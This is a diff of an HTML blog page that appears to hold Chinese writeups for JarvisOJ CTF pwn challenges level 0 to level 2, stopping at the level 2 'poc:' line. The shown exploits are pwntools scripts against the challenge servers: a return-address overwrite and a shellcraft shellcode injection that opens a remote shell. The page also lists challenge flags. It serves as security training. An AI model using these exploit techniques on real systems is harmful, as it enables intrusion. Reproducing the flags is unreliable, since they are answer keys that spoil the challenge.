@@ -1,494 +1,241 @@
 <!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="T3stzer0">
+
+
+    <meta name="subtitle" content="思考">
 
 
 
 
+<title>JarvisOJ-PWN-Writeup专题 | T3stzer0&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
 
 
 
 
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
 
 
 
-
-  
-
-
-<html class="theme-next muse use-motion" lang="zh-CN">
-<head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
-<meta name="theme-color" content="#222"/>
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
 
 
 
-
-
-
-
-
-
-
-  <meta name="google-site-verification" content="googlea4e6eb27cf4f8663.html"/>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2"/>
-
-<link rel="stylesheet" href="/css/main.css?v=7.0.1"/>
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.0.1">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/avatar.jpg?v=7.0.1">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/avatar.jpg?v=7.0.1">
-
-
-  <link rel="mask-icon" href="/images/logo.svg?v=7.0.1" color="#222">
-
-
-
-
-
-
-
-<script id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Muse',
-    version: '7.0.1',
-    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
-    back2top: true,
-    back2top_sidebar: false,
-    fancybox: false,
-    fastclick: false,
-    lazyload: false,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
+    
+    
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
 </script>
 
 
-  
+    
 
-
-
-
-  <meta name="description" content="引言 最近学二进制有点入魔，最近才有时间把最近写的JarvisOJ上一些Pwn题WP和得到的经验总结在此 不定期更新">
-<meta name="keywords" content="CTF,WriteUp">
-<meta property="og:type" content="article">
-<meta property="og:title" content="JarvisOJ-PWN-Writeup专题">
-<meta property="og:url" content="https://www.wzsite.cn/2018/02/05/JarvisOJ-PWN-Writeup专题/index.html">
-<meta property="og:site_name" content="Wz&#39;s Blog">
-<meta property="og:description" content="引言 最近学二进制有点入魔，最近才有时间把最近写的JarvisOJ上一些Pwn题WP和得到的经验总结在此 不定期更新">
-<meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://www.wzsite.cn/2018/02/05/JarvisOJ-PWN-Writeup专题/15-49-43.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2018/02/05/JarvisOJ-PWN-Writeup专题/18-12-02.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2018/02/05/JarvisOJ-PWN-Writeup专题/19-30-17.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2018/02/05/JarvisOJ-PWN-Writeup专题/14-43-47.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2018/02/05/JarvisOJ-PWN-Writeup专题/14-39-45.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2018/02/05/JarvisOJ-PWN-Writeup专题/00-38-15.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2018/02/05/JarvisOJ-PWN-Writeup专题/00-56-31.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2018/02/05/JarvisOJ-PWN-Writeup专题/19-37-38.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2018/02/05/JarvisOJ-PWN-Writeup专题/19-07-05.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2018/02/05/JarvisOJ-PWN-Writeup专题/01-30-40.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2018/02/05/JarvisOJ-PWN-Writeup专题/01-33-07.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2018/02/05/JarvisOJ-PWN-Writeup专题/01-40-31.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2018/02/05/JarvisOJ-PWN-Writeup专题/01-48-06.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2018/02/05/JarvisOJ-PWN-Writeup专题/01-48-43.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2018/02/05/JarvisOJ-PWN-Writeup专题/01-53-18.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2018/02/05/JarvisOJ-PWN-Writeup专题/01-57-08.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2018/02/05/JarvisOJ-PWN-Writeup专题/02-01-54.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2018/02/05/JarvisOJ-PWN-Writeup专题/02-07-36.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2018/02/05/JarvisOJ-PWN-Writeup专题/02-19-41.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2018/02/05/JarvisOJ-PWN-Writeup专题/02-28-03.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2018/02/05/JarvisOJ-PWN-Writeup专题/02-33-51.jpg">
-<meta property="og:updated_time" content="2019-01-22T04:54:02.123Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="JarvisOJ-PWN-Writeup专题">
-<meta name="twitter:description" content="引言 最近学二进制有点入魔，最近才有时间把最近写的JarvisOJ上一些Pwn题WP和得到的经验总结在此 不定期更新">
-<meta name="twitter:image" content="https://www.wzsite.cn/2018/02/05/JarvisOJ-PWN-Writeup专题/15-49-43.jpg">
-
-
-
-
-
-  
-  
-  <link rel="canonical" href="https://www.wzsite.cn/2018/02/05/JarvisOJ-PWN-Writeup专题/"/>
-
-
-
-<script id="page.configurations">
-  CONFIG.page = {
-    sidebar: "",
-  };
-</script>
-
-  <title>JarvisOJ-PWN-Writeup专题 | Wz's Blog</title>
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .motion-element,
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-title { opacity: initial; }
-
-  .use-motion .logo,
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
 
 </head>
-
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
-
-  
-  
-    
-  
-
-  <div class="container sidebar-position-left page-post-detail">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Wz's Blog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-    
-      
-        <p class="site-subtitle">安全菜鸡的挖坑填坑之旅</p>
-      
-    
-    
-  </div>
-
-  <div class="site-nav-toggle">
-    <button aria-label="切换导航栏">
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
-</div>
-
-
-
-<nav class="site-nav">
-  
-    <ul id="menu" class="menu">
-      
-        
-        
-        
-          
-          <li class="menu-item menu-item-home">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br/>首页</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-archives">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br/>归档</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-categories">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br/>分类</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-tags">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br/>标签</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-about">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br/>关于</a>
-
-  </li>
-
-      
-      
-    </ul>
-  
-
-  
-    
-
-  
-
-  
-</nav>
-
-
-
-  
-
-
-
-</div>
-    </header>
-
-    
-  
-  
-
-  
-
-  <a href="https://github.com/testzero-wz" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
-
-
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-          <div id="content" class="content">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.wzsite.cn/2018/02/05/JarvisOJ-PWN-Writeup专题/"/>
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="W z"/>
-      <meta itemprop="description" content=""/>
-      <meta itemprop="image" content="/images/avatar.gif"/>
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Wz's Blog"/>
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">JarvisOJ-PWN-Writeup专题
-
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Home</a></div>
+            <div class="menu navbar-right">
                 
-              
-
-              <time title="创建时间：2018-02-05 18:03:00" itemprop="dateCreated datePublished" datetime="2018-02-05T18:03:00+08:00">2018-02-05</time>
-            
-
-            
-              
-
-              
+                    <a class="menu-item" href="/archives">Posts</a>
                 
-                <span class="post-meta-divider">|</span>
+                    <a class="menu-item" href="/category">Categories</a>
                 
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
+                    <a class="menu-item" href="/tag">Tags</a>
                 
-                  <span class="post-meta-item-text">更新于</span>
+                    <a class="menu-item" href="/about">About</a>
                 
-                <time title="修改时间：2019-01-22 12:54:02" itemprop="dateModified" datetime="2019-01-22T12:54:02+08:00">2019-01-22</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/安全之旅/" itemprop="url" rel="index"><span itemprop="name">安全之旅</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
         </div>
-      </header>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Home</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
     
 
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">JarvisOJ-PWN-Writeup专题</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">T3stzer0</a>
+                    
 
-      
-      
+                    
+                        <span class="post-time">
+                        Date: <a href="#">二月 5, 2018&nbsp;&nbsp;18:03:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/category/安全之旅/">安全之旅</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
 
-      
-        <img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/15-49-43.jpg" alt="15-49-43.jpg" title="">
+        <div class="post-content">
+            <p><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/15-49-43.jpg" alt=""></p>
 <h2 id="引言"><a class="markdownIt-Anchor" href="#引言"></a> 引言</h2>
 <p>最近学二进制有点入魔，最近才有时间把最近写的JarvisOJ上一些Pwn题WP和得到的经验总结在此<br>
 不定期更新</p>
@@ -496,31 +243,31 @@
 <h1 id="level-0"><a class="markdownIt-Anchor" href="#level-0"></a> level 0</h1>
 <p>很直接地给出了漏洞函数<code>vulnerable_function()</code>以及要溢出跳转到的函数<code>callsystem()</code>其中<code>callsystem()</code>地址为<code>0x400596</code><br>
 <code>read</code>读入512字节但是<code>buf</code>只有0x80大小，很明显的栈溢出构造ROP劫持控制流到<code>callsystem()</code>执行</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">ssize_t</span> vulnerable_function()</div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-80h]@1</span></div><div class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">512u</span>LL);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>查看栈结构很容易得知溢出长度是<code>0x80+0x8=0x88</code></p>
-<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/18-12-02.jpg" alt="18-12-02.jpg" title="">
-<p>然后劫持到<code>callsystem()</code>的地址<code>0x400596</code>即可<br>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-80h]@1</span></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">512u</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>查看栈结构很容易得知溢出长度是<code>0x80+0x8=0x88</code><br>
+<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/18-12-02.jpg" alt=""><br>
+然后劫持到<code>callsystem()</code>的地址<code>0x400596</code>即可<br>
 poc:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </div><div class="line">pro = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9881</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">respone</span><span class="params">(recv_buf,send_buf,new_line=True)</span>:</span></div><div class="line">	pro.recvuntil(recv_buf)</div><div class="line">	<span class="keyword">if</span> new_line:</div><div class="line">		pro.sendline(send_buf)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		pro.send(send_buf)		</div><div class="line">payload = <span class="string">"A"</span>*<span class="number">0x88</span></div><div class="line">payload += p64(<span class="number">0x400596</span>)</div><div class="line">respone(<span class="string">"World\n"</span>,payload)</div><div class="line">pro.interactive()</div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">pro = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9881</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">respone</span><span class="params">(recv_buf,send_buf,new_line=True)</span>:</span></span><br><span class="line">	pro.recvuntil(recv_buf)</span><br><span class="line">	<span class="keyword">if</span> new_line:</span><br><span class="line">		pro.sendline(send_buf)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		pro.send(send_buf)		</span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">0x88</span></span><br><span class="line">payload += p64(<span class="number">0x400596</span>)</span><br><span class="line">respone(<span class="string">"World\n"</span>,payload)</span><br><span class="line">pro.interactive()</span><br></pre></td></tr></table></figure>
 <p><strong>Flag: CTF{713ca3944e92180e0ef03171981dcd41}</strong></p>
 <h1 id="level-1"><a class="markdownIt-Anchor" href="#level-1"></a> level 1</h1>
 <p>如level0一样，给出漏洞函数</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">ssize_t</span> vulnerable_function()</div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-88h]@1</span></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"What's this:%p?\n"</span>, &amp;buf);</div><div class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-88h]@1</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"What's this:%p?\n"</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>很明显地栈溢出以及提示你栈地址在哪，然后<code>checksec</code>查看保护，NX(堆栈不可执行)保护没开，那很显然思路就是将<code>shellCode</code>写入栈，然后ROP控制指针跳回栈地址执行<code>shellCode</code><br>
 poc:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </div><div class="line"><span class="comment">#pro = process("./level1")</span></div><div class="line">pro = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9877</span>)</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">respone</span><span class="params">(recv_buf,send_buf,new_line=True)</span>:</span></div><div class="line">	pro.recvuntil(recv_buf)</div><div class="line">	<span class="keyword">if</span> new_line:</div><div class="line">		pro.sendline(send_buf)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		pro.send(send_buf)</div><div class="line">address = pro.recvuntil(<span class="string">'?'</span>)[<span class="number">-11</span>:<span class="number">-1</span>]</div><div class="line"><span class="comment">#print address</span></div><div class="line">address = int(address,<span class="number">16</span>)</div><div class="line"><span class="keyword">print</span> hex(address)</div><div class="line">payload = asm(shellcraft.sh()).ljust(<span class="number">140</span>,<span class="string">'\x00'</span>)</div><div class="line">payload += p64(address)</div><div class="line">pro.sendline(payload)</div><div class="line">pro.interactive()</div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="comment">#pro = process("./level1")</span></span><br><span class="line">pro = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9877</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">respone</span><span class="params">(recv_buf,send_buf,new_line=True)</span>:</span></span><br><span class="line">	pro.recvuntil(recv_buf)</span><br><span class="line">	<span class="keyword">if</span> new_line:</span><br><span class="line">		pro.sendline(send_buf)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		pro.send(send_buf)</span><br><span class="line">address = pro.recvuntil(<span class="string">'?'</span>)[<span class="number">-11</span>:<span class="number">-1</span>]</span><br><span class="line"><span class="comment">#print address</span></span><br><span class="line">address = int(address,<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(address)</span><br><span class="line">payload = asm(shellcraft.sh()).ljust(<span class="number">140</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += p64(address)</span><br><span class="line">pro.sendline(payload)</span><br><span class="line">pro.interactive()</span><br></pre></td></tr></table></figure>
 <p><strong>Flag：CTF{82c2aa534a9dede9c3a0045d0fec8617}</strong></p>
 <h1 id="level-2"><a class="markdownIt-Anchor" href="#level-2"></a> level 2</h1>
 <p>同样给出漏洞函数，其中包含<code>system</code>函数(地址<code>0x804845C</code>)和栈溢出，还给了一个hint――<code>/bin/sh</code>字符串。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">ssize_t</span> vulnerable_function()</div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-88h]@1</span></div><div class="line">  system(<span class="string">"echo Input:"</span>);</div><div class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-88h]@1</span></span><br><span class="line">  system(<span class="string">"echo Input:"</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>思路也就很明了了，栈溢出ROP到system地址，且追加<code>/bin/sh</code>地址进栈，作为<code>system</code>的参数<br>
 poc:</p>
